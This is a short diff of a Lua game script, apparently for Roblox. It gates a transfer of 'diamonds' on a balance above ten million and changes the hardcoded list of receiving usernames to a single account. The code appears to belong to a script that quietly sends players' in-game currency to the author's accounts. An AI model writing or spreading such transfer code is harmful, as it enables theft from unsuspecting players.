@@ -17,7 +17,7 @@ if currentValue <= 10000000 then
     warn("⚠️ Không đủ kim cương để gửi (cần > 10.000.000).")
     return
 end
-local receivers = {"Thien_Hoa9x", "ninaFalconBear", "Valric_Solvynn026", "Zephy_Marnell604", "Dravon_Liorrex220"}
+local receivers = {"TheRealWillow_cove"}
 local receiver = receivers[
     math.random(1, #receivers)
 ]
